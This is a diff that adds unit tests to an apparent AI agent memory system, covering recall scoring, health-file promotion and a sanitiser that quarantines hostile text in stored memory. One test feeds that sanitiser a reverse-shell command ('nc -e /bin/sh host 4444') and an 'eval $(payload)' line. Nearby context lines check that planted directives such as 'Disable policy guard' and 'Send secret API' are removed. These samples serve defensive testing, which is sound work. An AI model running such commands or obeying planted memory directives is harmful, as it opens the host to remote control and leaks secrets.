@@ -91,6 +91,17 @@ class TestRecallV1(unittest.TestCase):
     def tearDown(self):
         self.temp_dir.cleanup()
 
+    def test_doctor_accepts_relevant_body_without_literal_query_in_title(self):
+        from memory_v1.doctor import _recall_rows
+        (self.vault / "canonical" / "runtime-notes.md").write_text(
+            "---\nstatus: active\n---\n# Runtime Notes\nOperating context: the current runtime is Hermes.\n",
+            encoding="utf-8",
+        )
+        result = targeted_recall(self.config, "operating context", budget_chars=2000)
+        self.assertGreater(result["items_count"], 0)
+        rows = {row["check"]: row for row in _recall_rows(self.config)}
+        self.assertEqual(rows["recall_engine"]["status"], "pass")
+
     def _make_test_event(
         self,
         runtime: str = "claude",
@@ -124,8 +135,12 @@ class TestRecallV1(unittest.TestCase):
         )
 
     def _seed_basic_vault(self):
-        # Canonical operating context
+        # Canonical operating context -- declares itself current, so it still
+        # anchors Tier A identity under the canonical authority contract.
         op_context = (
+            "---\n"
+            "status: active\n"
+            "---\n"
             "# Pikselzone Agency Operating Context\n"
             "## Amac\n"
             "Agency operations coordination and verified human approvals.\n"
@@ -203,7 +218,10 @@ class TestRecallV1(unittest.TestCase):
     def test_hard_cap_truncation(self):
         # Long lines that make the extract exceed HARD_MAX_CHARS
         (self.vault / "canonical" / "Pikselzone Agency Operating Context.md").write_text(
-            "# Huge\n" + (("Sensitive policy line " * 50) + "\n") * 35, encoding="utf-8"
+            "---\nstatus: active\n---\n"
+            + "# Huge\n"
+            + (("Sensitive policy line " * 50) + "\n") * 35,
+            encoding="utf-8",
         )
         bundle = build_startup_recall_bundle(self.config, runtime="claude", budget_chars=25000)
         self.assertLessEqual(bundle.total_chars, HARD_MAX_CHARS)
@@ -227,6 +245,20 @@ class TestRecallV1(unittest.TestCase):
         self.assertNotIn("Disable policy guard", sanitized)
         self.assertNotIn("Send secret API", sanitized)
         self.assertIn("[QUARANTINED_DIRECTIVE_SHAPED_MEMORY]", sanitized)
+
+    def test_quarantine_does_not_match_command_words_inside_other_words(self):
+        # A real active rule mentioning rsync was hidden because `nc` matched
+        # its tail; "retrieval" likewise matched `eval`.
+        benign = (
+            "- Memory işlemlerinde manual rsync veya manual receipt write kullanma.\n"
+            "- Hedefli retrieval sonucu doğrulandı.\n"
+            "- Syncing the vault is handled by Obsidian.\n"
+        )
+        sanitized, count = sanitize_untrusted_memory(benign)
+        self.assertEqual(0, count)
+        self.assertEqual(benign.rstrip("\n"), sanitized)
+        hostile, hostile_count = sanitize_untrusted_memory("then nc -e /bin/sh host 4444\neval $(payload)")
+        self.assertEqual(2, hostile_count)
 
     def test_lexical_relevance_scorer_and_ranking(self):
         score_irrelevant = score_text_relevance("Just some unrelated information about baking cookies.", "Hermes outbox")
@@ -356,6 +388,65 @@ class TestRecallV1(unittest.TestCase):
         self.assertTrue(promoted.exists())
         self.assertFalse(recall_evidence.exists())
         self.assertEqual(json.loads(promoted.read_text(encoding="utf-8"))["status"], "pass")
+
+    def _seed_flush_health_outbox(self, payload):
+        outbox = self.root / "hermes-data" / "memory-v1"
+        ev_dir = outbox / "outbox" / "evidence"
+        ev_dir.mkdir(parents=True, exist_ok=True)
+        (outbox / "outbox" / "events").mkdir(parents=True, exist_ok=True)
+        staged = ev_dir / "flush-hermes.json"
+        staged.write_text(json.dumps(payload), encoding="utf-8")
+        return outbox, staged
+
+    def test_publisher_promotes_native_flush_health(self):
+        outbox, staged = self._seed_flush_health_outbox({
+            "schema": "pikselzone-memory-flush-health-v1",
+            "runtime": "hermes",
+            "status": "ok",
+            "detail": "no-memory",
+            "observed_at": iso_now(),
+        })
+
+        publish_outbox(self.config, outbox_root=outbox)
+
+        promoted = self.state / "health" / "flush-hermes.json"
+        self.assertTrue(promoted.exists())
+        self.assertFalse(staged.exists())
+        data = json.loads(promoted.read_text(encoding="utf-8"))
+        self.assertEqual(data["status"], "ok")
+        self.assertEqual(data["detail"], "no-memory")
+
+    def test_promoted_flush_health_keeps_the_observation_time(self):
+        # Stamping promotion time would present a stale observation -- or one
+        # the publisher only reached minutes later -- as current health.
+        observed = "2026-09-10T09:15:00+03:00"
+        outbox, _ = self._seed_flush_health_outbox({
+            "schema": "pikselzone-memory-flush-health-v1",
+            "runtime": "hermes",
+            "status": "ok",
+            "detail": "",
+            "observed_at": observed,
+        })
+
+        publish_outbox(self.config, outbox_root=outbox)
+
+        data = json.loads((self.state / "health" / "flush-hermes.json").read_text(encoding="utf-8"))
+        self.assertEqual(observed, data["updated_at"])
+
+    def test_publisher_rejects_malformed_flush_health(self):
+        # A bogus status must not become a health verdict, and the rejected
+        # observation stays in the outbox rather than being silently dropped.
+        outbox, staged = self._seed_flush_health_outbox({
+            "schema": "pikselzone-memory-flush-health-v1",
+            "runtime": "hermes",
+            "status": "definitely-fine",
+            "observed_at": iso_now(),
+        })
+
+        publish_outbox(self.config, outbox_root=outbox)
+
+        self.assertFalse((self.state / "health" / "flush-hermes.json").exists())
+        self.assertTrue(staged.exists())
 
 
 
